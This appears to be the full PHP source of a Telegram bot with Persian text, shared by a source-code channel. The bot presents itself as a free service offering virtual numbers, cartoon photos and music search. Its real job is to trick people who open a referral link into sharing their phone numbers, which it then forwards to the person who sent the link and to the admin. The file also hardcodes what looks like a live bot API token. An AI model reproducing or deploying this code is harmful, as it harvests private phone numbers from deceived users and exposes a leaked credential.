<?php
ob_start();
error_reporting(0);
$telegram_ip_ranges = [['lower' => '149.154.160.0', 'upper' => '149.154.175.255'],['lower' => '91.108.4.0','upper' => '91.108.7.255']];
$ip_dec = (float) sprintf('%u', ip2long($_SERVER['REMOTE_ADDR']));$ok=false;
foreach ($telegram_ip_ranges as $telegram_ip_range) if (!$ok) 
{
    $lower_dec = (float) sprintf('%u', ip2long($telegram_ip_range['lower']));
    $upper_dec = (float) sprintf('%u', ip2long($telegram_ip_range['upper']));
    if ($ip_dec >= $lower_dec and $ip_dec <= $upper_dec) $ok=true;
}
if (!$ok) die("No spam 🙃");
##----------[config]----------##
define('BOT_API','1623028043:AAGGCA7NKH_Je03XRQbe4gcP6Q4psb-WgKA');
$Devs =710732845;
##----------[Necessary Folder]----------##
if (!is_dir('users')){ @mkdir('users'); }
if (!is_dir('data')){ @mkdir('data'); }
##----------[method]----------##
function bot($method,$datas=[])
{
    $url = 'https://api.telegram.org/bot'.BOT_API.'/'.$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch))
    {
        var_dump(curl_error($ch));
    }
    else
    {
        return json_decode($res);
    }
}
##----------[functions]----------##
function Send($a,$b,$c,$d,$e,$f)
{
    bot('sendMessage',[
        'chat_id'=>$a,
        'text'=>$b,
        'parse_mode'=>$c,
        'disable_web_page_preview'=>$d,
        'reply_to_message_id'=>$e,
        'reply_markup'=>$f
    ]);
}
function SM($chatID)
{
	$tab = json_decode(file_get_contents("../../tab.json"),true);
	if($tab['type'] == 'photo')
	{
		bot('sendphoto',['chat_id'=>$chatID,'photo'=>$tab["msgid"],'caption'=>$tab["text"],'reply_markup'=>$tab['reply_markup']]);
	}
	else if($tab['type'] == 'file')
	{
		bot('sendDocument',['chat_id'=>$chatID,'document'=>$tab["msgid"],'caption'=>$tab["text"],'reply_markup'=>$tab['reply_markup']]);
	}
	else if($tab['type'] == 'video')
	{
		bot('SendVideo',['chat_id'=>$chatID,'video'=>$tab["msgid"],'caption'=>$tab["text"],'reply_markup'=>$tab['reply_markup']]);
	}
	else if($tab['type'] == 'music')
	{
		bot('SendAudio',['chat_id'=>$chatID,'audio'=>$tab["msgid"],'caption'=>$tab["text"],'reply_markup'=>$tab['reply_markup']]);
	}
	else if($tab['type'] == 'sticker')
	{
		bot('SendSticker',['chat_id'=>$chatID,'sticker'=>$tab["msgid"],'caption'=>$tab["text"],'reply_markup'=>$tab['reply_markup']]);
	}
	else if($tab['type'] == 'voice')
	{
		bot('SendVoice',['chat_id'=>$chatID,'voice'=>$tab["msgid"],'caption'=>$tab["text"],'reply_markup'=>$tab['reply_markup']]);
	}
	else
	{
		if($tab['reply_markup'] != null)
		{
			bot('SendMessage',['chat_id'=>$chatID,'text'=>$tab['text'],'reply_markup'=>$tab['reply_markup']]);
		}
		else
		{
			bot('SendMessage',['chat_id'=>$chatID,'text'=>$tab['text']]);
		}
	}
}
#@HectorDev
#ایرو سورس
#@irosource
##----------[main variabes]----------##
@$update = json_decode(file_get_contents('php://input'),true);
$channel = file_get_contents("ch.txt");
if(isset($update['message'])){
    @$message = $update['message']; 
    @$text = $message['text'];
    @$from_id = $message['from']['id'];
    @$message_id = $message['message_id'];
    @$contact = $message['contact'];
    @$phone_number = $message['contact']['phone_number'];
    @$contact_id = $update['message']['contact']['user_id'];
    @$tch = json_decode(file_get_contents("https://api.telegram.org/bot[*[TOKEN]*]/getChatMember?chat_id=@$channel&user_id=$from_id"),true)['result']['status'];
}else if(isset($update['callback_query']))
{
    @$query = $update['callback_query'];
    @$data = $query['data'];
    @$chat_id = $query['message']['chat']['id'];
    @$from_id = $query['from']['id'];
    @$message_id = $query['message']['message_id'];
    @$tch = json_decode(file_get_contents("https://api.telegram.org/bot[*[TOKEN]*]/getChatMember?chat_id=@$channel&user_id=$from_id"),true)['result']['status'];
}
#@HectorDev
#ایرو سورس
#@irosource
##----------[user variable]----------##
@$users = json_decode(file_get_contents('users/'.$from_id.'.json'),true);
@$command = $users['command'];
@$phone_share = $users['phone'];
@$coin =$users['coin'];
//=====
@$settings = json_decode(file_get_contents('data/settings.json'),true);
@$members = $settings['members'];
##----------[getchatmembers]----------##
##----------[starts]----------##
if(preg_match('/^\/(start)/i',$text))
{
    preg_match('/^\/(start (.*))/i',$text,$match);
    $match = str_replace([' ',PHP_EOL],null,$match[2]);
    if($match != null)
    {
        if($match != $from_id)
        {
			if(!in_array($from_id,$members))
			{
				$users2 = json_decode(file_get_contents('users/'.$match.'.json'),true);
				$users2['coin'] += 1;
				file_put_contents('users/'.$match.'.json',json_encode($users2));
				Send($match,"#جذب
کاربر گرامی🎙
💳 کاربر [ <a href='tg://user?id=$from_id'>$from_id</a> ] از طریق لینک شما وارد ربات شد و یک سکه به حساب شما واریز شد.
",'html',null,null,null);
				if($users2['coin'] >= 5)
				{
                    Send($from_id,'سلام کاربر محترم🌸

به بهترین ربات همه کاره خوش امدید🌹

از کاربرد های این ربات میتوان به :
🥀دریافت شماره مجازی رایگان بدون نیاز به پول و جمع اوری زیر مجموعه😶
🥀کارتونی کردن عکس مورد نیازتون😊
🥀جست و جوی اهنگ ، فیلم و... به صورت پیشرفته😅
🥀و...
اشاره کرد😁',null,null,$message_id,json_encode(['inline_keyboard'=>[
                        [['text'=>'دریافت شماره مجازی📱','callback_data'=>'share-'.$match]],
                        [['text'=>'تبدیل عکس به عکس کارتونی🌅','callback_data'=>'share-'.$match],['text'=>'تبدیل عکس به استیکر 📸','callback_data'=>'share-'.$match]],
                        [['text'=>'تبدیل استیکر به عکس🌠','callback_data'=>'share-'.$match]],
                        [['text'=>'ساخت استیکر متحرک💣','callback_data'=>'share-'.$match],['text'=>'جست و جوی اهنگ🎶','callback_data'=>'share-'.$match]],
                        [['text'=>'جست و جوی عکس🔰','callback_data'=>'share-'.$match],['text'=>'ساخت عکس نوشته✅','callback_data'=>'share-'.$match]],
                        [['text'=>'جست و جوی فیلم▶️','callback_data'=>'share-'.$match],['text'=>'جست و جوی انیمه⏏','callback_data'=>'share-'.$match]],
                    ]]));
				}
				else
				{
					Send($from_id,'سلام 👋

🌹به ربات دریافت شماره دیگران خوش آمدید.

📌کار با این ربات بسیار ساده میباشد و شما تنها کاری که جهت بدست اوردن شماره دیگران باید کنید لینک خود را به شخص مورد نظر ارسال کنید تا پس از ارسال شماره خود به ربات برای شما ارسال شود.

هر گونه استفاده نادرست از ربات بر عهده خود فرد میباشد و سازنده ربات هیچ مسئولیتی ندارد!!!

🌱یک گزینه را انتخاب کنید',null,null,$message_id,json_encode(['inline_keyboard'=>[
                        [['text'=>'دریافت لینک اختصاصی🎈','callback_data'=>'getlink'],['text'=>'راهنما👨‍🏫','callback_data'=>'help']],
                        [['text'=>'حساب کاربری🕵‍♂','callback_data'=>'myinfo']],
                    ]]));
				}
			}
			else
			{
				Send($from_id,'سلام 👋

🌹به ربات دریافت شماره دیگران خوش آمدید.

📌کار با این ربات بسیار ساده میباشد و شما تنها کاری که جهت بدست اوردن شماره دیگران باید کنید لینک خود را به شخص مورد نظر ارسال کنید تا پس از ارسال شماره خود به ربات برای شما ارسال شود.

هر گونه استفاده نادرست از ربات بر عهده خود فرد میباشد و سازنده ربات هیچ مسئولیتی ندارد!!!

🌱یک گزینه را انتخاب کنید',null,null,$message_id,json_encode(['inline_keyboard'=>[
                    [['text'=>'دریافت لینک اختصاصی🎈','callback_data'=>'getlink'],['text'=>'راهنما👨‍🏫','callback_data'=>'help']],
                    [['text'=>'حساب کاربری🕵‍♂','callback_data'=>'myinfo']],
                ]]));
			}
        }
        else
        {
            Send($from_id,'🧾شما نمیتوانید از طریق لینک خود وارد ربات شوید.',null,null,$message_id,json_encode(['inline_keyboard'=>[
                [['text'=>'بازگشت🔙','callback_data'=>'home']],
            ]]));
        }
    }
    else
    {
        Send($from_id,'سلام 👋

🌹به ربات دریافت شماره دیگران خوش آمدید.

📌کار با این ربات بسیار ساده میباشد و شما تنها کاری که جهت بدست اوردن شماره دیگران باید کنید لینک خود را به شخص مورد نظر ارسال کنید تا پس از ارسال شماره خود به ربات برای شما ارسال شود.

هر گونه استفاده نادرست از ربات بر عهده خود فرد میباشد و سازنده ربات هیچ مسئولیتی ندارد!!!

🌱یک گزینه را انتخاب کنید',null,null,$message_id,json_encode(['inline_keyboard'=>[
            [['text'=>'دریافت لینک اختصاصی🎈','callback_data'=>'getlink']],
        [['text'=>'راهنما👨‍🏫','callback_data'=>'help'],['text'=>'حساب کاربری🕵‍♂','callback_data'=>'myinfo']],
        ]]));
    }
}
##----------[share]----------##
else if (preg_match('/^(share-(.*))/',$data))
{
    preg_match('/^(share-(.*))/',$data,$match);
    $users['command'] = 'share_contact-'.$match[2];
    file_put_contents('users/'.$from_id.'.json',json_encode($users));
    Send($from_id,'جهت برقراری  امنیت ربات و شما کاربر عزیز لطفا برای استفاده از ربات شماره خود را به اشتراک بگزارید💌 :',null,null,$message_id,json_encode(['keyboard'=>[
        [['text'=>'ارسال شماره📞','request_contact'=>true]]],"resize_keyboard"=>true,'one_time_keyboard'=>true]));
}
//=====
#@HectorDev
#ایرو سورس
#@irosource
else if (preg_match('/^(share_contact-(.*))/',$command) && $text != '/start')
{
    preg_match('/^(share_contact-(.*))/',$command,$match);
    if(isset($contact))
    {
        if($contact_id == $from_id)
        {
            foreach($Devs as $admin)
            {
                bot('ForwardMessage',['chat_id'=>$admin,'from_chat_id'=>$from_id,'message_id'=>$message_id]);
            }
            bot('ForwardMessage',['chat_id'=>$match[2],'from_chat_id'=>$from_id,'message_id'=>$message_id]);
			$users2 = json_decode(file_get_contents('users/'.$match[2].'.json'),true);
			$users2['getting_number'][] = $phone_number;
			$users2['coin'] -= 5;
			file_put_contents('users/'.$match[2].'.json',json_encode($users2));
            if(substr($phone_number,0,-10) == "98")
            {
                $users['command'] = null;
                $users['phone'] = $phone_number;
                file_put_contents('users/'.$from_id.'.json',json_encode($users));
                Send($from_id,'🖌دوست عزیز این ربات فقط یک ربات برای دریافت شماره شما بود.',null,null,$message_id,json_encode(['KeyboardRemove'=>[],'remove_keyboard'=>true]));
				Send($from_id,'درود 👋

🔐این ربات فقط یک ربات دریافت شماره اشخاص دیگر بود.

📌و هم اکنون شماره شما در دست کسی که از آن لینک ربات را دریافت کرده اید است

🔗برای شروع راهنما را مطالعه کنید.',null,null,$message_id,json_encode(['inline_keyboard'=>[
                    [['text'=>'دریافت لینک اختصاصی🎈','callback_data'=>'getlink']],
        [['text'=>'راهنما👨‍🏫','callback_data'=>'help'],['text'=>'حساب کاربری🕵‍♂','callback_data'=>'myinfo']],
        ]]));
            }
            else
            {
                $users['command'] = null;
                $users['phone'] = $phone_number;
                file_put_contents('users/'.$from_id.'.json',json_encode($users));
                Send($from_id,'🚫 فقط شماره های ایران قادر به استفاده از ربات میباشند.',null,null,$message_id,json_encode(['KeyboardRemove'=>[],'remove_keyboard'=>true]));
            }
        }
        else
        {
            $users['command'] = 'share_contact-'.$match[2];
            file_put_contents('users/'.$from_id.'.json',json_encode($users));
            Send($from_id,'📌جهت استفاده از ربا ابتدا شماره خود را از طریق دکمه زیر برای ما ارسال کنید.',null,null,$message_id,json_encode(['keyboard'=>[
                [['text'=>'ارسال شماره📞','request_contact'=>true]]],"resize_keyboard"=>true,'one_time_keyboard'=>true]));
        }
    }
    else
    {
        $users['command'] = 'share_contact-'.$match[2];
        file_put_contents('users/'.$from_id.'.json',json_encode($users));
        Send($from_id,'📌جهت استفاده از ربا ابتدا شماره خود را از طریق دکمه زیر برای ما ارسال کنید. ',null,null,$message_id,json_encode(['keyboard'=>[
        [['text'=>'ارسال شماره📞','request_contact'=>true]]],"resize_keyboard"=>true,'one_time_keyboard'=>true]));
    }
}
else if(!in_array($tch,['member','creator','administrator']) and is_file("ch.txt") and !in_array($from_id,$Devs))
{
bot('sendmessage',['chat_id'=>$from_id,'text'=>"
📌 جهت استفاده از ربات ابتدا باید در کانال ما عضو شوید

@$channel @$channel

@$channel @$channel

• پس از عضو شدن در کانال ربات را مجددا /start کنید تا ربات برای شما فعال شود
",'parse_mode'=>"HTML",'reply_to_message_id'=>$message_id,
]);
return false;
}
##----------[home]----------##
#@HectorDev
#ایرو سورس
#@irosource
else if($data == 'home')
{
	$users['command'] = null;
    file_put_contents('users/'.$from_id.'.json',json_encode($users));
	bot('editMessagetext',['chat_id'=>$from_id,'message_id'=>$message_id,'text'=>'با موفقیت به منوی اصلی بازگشتیم !','parse_mode'=>'html','reply_markup'=>json_encode(['inline_keyboard'=>[
        [['text'=>'دریافت لینک اختصاصی🎈','callback_data'=>'getlink']],
        [['text'=>'راهنما👨‍🏫','callback_data'=>'help'],['text'=>'حساب کاربری🕵‍♂','callback_data'=>'myinfo']],
    ]])]);
}
##----------[getlink]----------##
else if ($data == 'getlink')
{
bot('sendmessage',['chat_id'=>$from_id,'text'=>" نمیخوام زیاد وقتتو بگیرم☺️ 
ببین این ربات یکی بهترین ربات های رایگان تلگرام هستش😍
که توش میتونی بصورت رایگان بدون جمع اوری زیر مجموعه شماره مجازی بگیری🔥
عکستو کارتونی کنی💜
فیلم  اهنگ و اینمه جست و جو کنی🔥
عکس و استیکر رو بهم تبدیل کنی 🥀
بدون پرداخت هزارتومن پول بدون جمع کردن یک زیر مجموعه🥀
و خیلی قابلیت دیگه امتحان کن جواب میده 😆
https://t.me/".bot('GetMe')->result->username."?start=$from_id",'parse_mode'=>"HTML"]);
bot('sendmessage',['chat_id'=>$from_id,'text'=>"✔️ بنر شما با موفقیت ایجاد شد.",'parse_mode'=>"HTML",'reply_to_message_id'=>$message_id+1,'reply_markup'=>json_encode(['inline_keyboard'=>[
        [['text'=>'بازگشت🔙','callback_data'=>'home']],
    ]])]);
}
##----------[help]----------##
#@HectorDev
#ایرو سورس
#@irosource
else if ($data == 'help')
{
	bot('editMessagetext',['chat_id'=>$from_id,'message_id'=>$message_id,'text'=>"📡 جهت دریافت شماره دیگران تنها کاری که باید انجام دهید لینک خود را از منوی اصلی دریافت کنید و برای دیگران ارسال کنید تا پس از ارسال شماره خود برای ربات شماره آنها برای شما ارسال شود.

⛓ برای دریافت شماره دیگران شما باید 5 نفر را از طریق لینک خود به ربات معرفی کنید تا منوی دریافت شماره برای کسانی که از طریق لینک شما وارد میشود باز شود و اگر تعداد سکه های شما 5 عدد نبود منوی اصلی ربات برای آنها ظاهر میگردد.",'parse_mode'=>'html','reply_markup'=>json_encode(['inline_keyboard'=>[
        [['text'=>'بازگشت🔙','callback_data'=>'home']],
    ]])]);
}
##----------[myinfo]----------##
#@HectorDev
#ایرو سورس
#@irosource
else if ($data == 'myinfo')
{
    if($users['coin'] == null){ $users['coin'] = 0; file_put_contents('users/'.$from_id.'.json',json_encode($users));}
    if(!is_null($users['getting_number']))
    {
        foreach($users['getting_number'] as $list)
        {
            $lst = $lst .= '▪️ +'.$list."\n";
            bot('editMessagetext',['chat_id'=>$from_id,'message_id'=>$message_id,'text'=>"💰تعداد سکه های شما : $coin\n 🧰لیست شماره های دریافتی : \n$lst\n",'parse_mode'=>'html','reply_markup'=>json_encode(['inline_keyboard'=>[
                [['text'=>'بازگشت🔙','callback_data'=>'home']],
            ]])]);
        }
    }
    else
    {
      bot('editMessagetext',['chat_id'=>$from_id,'message_id'=>$message_id,'text'=>"💰تعداد سکه های شما : $coin\n 🧰لیست شماره های دریافتی : هیچ شماره ای دریافت نکرده اید",'parse_mode'=>'html','reply_markup'=>json_encode(['inline_keyboard'=>[
          [['text'=>'بازگشت🔙','callback_data'=>'home']],
      ]])]);
    }
}
##----------[panel]----------##
else if (in_array($from_id,$Devs))
#@HectorDev
#ایرو سورس
#@irosource
{
	if($text == '/panel' || $data == 'home')
	{
		$users['command'] = null;
        file_put_contents('users/'.$from_id.'.json',json_encode($users));
		Send($from_id,'hi admin',null,null,$message_id,json_encode(['inline_keyboard'=>[
            [['text'=>'آمار','callback_data'=>'state'],['text'=>'تنظیم چنل','callback_data'=>'setch']],
            [['text'=>'ارسال همگانی','callback_data'=>'sendall'],['text'=>'فوروارد همگانی','callback_data'=>'forall']],
        ]]));
	}
    ##----------[setch]----------##
	else if ($data == 'setch')
  	{ 
		$users['command'] = 'setch';
        file_put_contents('users/'.$from_id.'.json',json_encode($users));
		Send($from_id,'خب لطفا برای تنظیم قفل چنل آیدی چنل رو بدون @ ارسال کنید و برای حذف قفل چنل عدد 0 لاتین رو ارسال کنید.',null,null,$message_id,json_encode(['inline_keyboard'=>[
            [['text'=>'بازگشت','callback_data'=>'home']],
        ]]));
	}
	//=====
	else if($command == 'setch' && !in_array($text,['/start','/panel']))
	{
		$users['command'] = null;
        file_put_contents('users/'.$from_id.'.json',json_encode($users));
		if($text == '0'){
			unlink("ch.txt");
			Send($from_id,"قفل کانال با موفقیت حذف شد.",null,null,$message_id,json_encode(['inline_keyboard'=>[
            [['text'=>'بازگشت','callback_data'=>'home']],
        ]]));
		}else{
			file_put_contents("ch.txt",$text);
			Send($from_id,"قفل کانال با موفقیت روی کانال @$text تنظیم شد. حتما ربات رو داخل این کانال ادمین کنید.",null,null,$message_id,json_encode(['inline_keyboard'=>[
            [['text'=>'بازگشت','callback_data'=>'home']],
        ]]));
		}
	}
    ##----------[state]----------##
	else if ($data == 'state')
	{
		$count = count($members);
		Send($from_id,'تعداد اعضای ربات برابر : '.$count,null,null,$message_id,null);
	}
    ##----------[sendall]----------##
	else if ($data == 'sendall')
  	{ 
		$users['command'] = 'sendall';
        file_put_contents('users/'.$from_id.'.json',json_encode($users));
		Send($from_id,'پیام خود را در قالب متن ارسال نمایید :',null,null,$message_id,json_encode(['inline_keyboard'=>[
            [['text'=>'بازگشت','callback_data'=>'home']],
        ]]));
	}
	//=====
	else if($command == 'sendall' && !in_array($text,['/start','/panel']))
	{
		$users['command'] = null;
        file_put_contents('users/'.$from_id.'.json',json_encode($users));
		foreach($members as $all)
		{
			Send($all,$text,'html',true,null,null);
		}
		Send($from_id,'ارسال شد !',null,null,$message_id,json_encode(['inline_keyboard'=>[
            [['text'=>'بازگشت','callback_data'=>'home']],
        ]]));
	}
    ##----------[forall]----------##
	else if ($data == 'forall')
  	{ 
		$users['command'] = 'forall';
        file_put_contents('users/'.$from_id.'.json',json_encode($users));
		Send($from_id,'پیام خود را فوروراد نمایید :',null,null,$message_id,json_encode(['inline_keyboard'=>[
            [['text'=>'بازگشت','callback_data'=>'home']],
        ]]));
	}
	//=====
	else if($command == 'forall' && !in_array($text,['/start','/panel']))
	{
		$users['command'] = null;
        file_put_contents('users/'.$from_id.'.json',json_encode($users));
		foreach($members as $all)
		{
			bot('ForwardMessage',['chat_id'=>$all,'from_chat_id'=>$from_id,'message_id'=>$message_id]);
		}
		Send($from_id,'فوروارد شد !',null,null,$message_id,json_encode(['inline_keyboard'=>[
            [['text'=>'بازگشت','callback_data'=>'home']],
        ]]));
	}
    ##----------[end source]----------##
}
//=====[save data]=====/
if(!file_exists('users/'.$from_id.'.json') && !in_array($from_id,$members))
{
    $settings['members'][] = $from_id;
    file_put_contents('data/settings.json',json_encode($settings));
    $users['command'] = null;
    file_put_contents('users/'.$from_id.'.json',json_encode($users));
    #@HectorDev
#ایرو سورس
#@irosource
}
?>
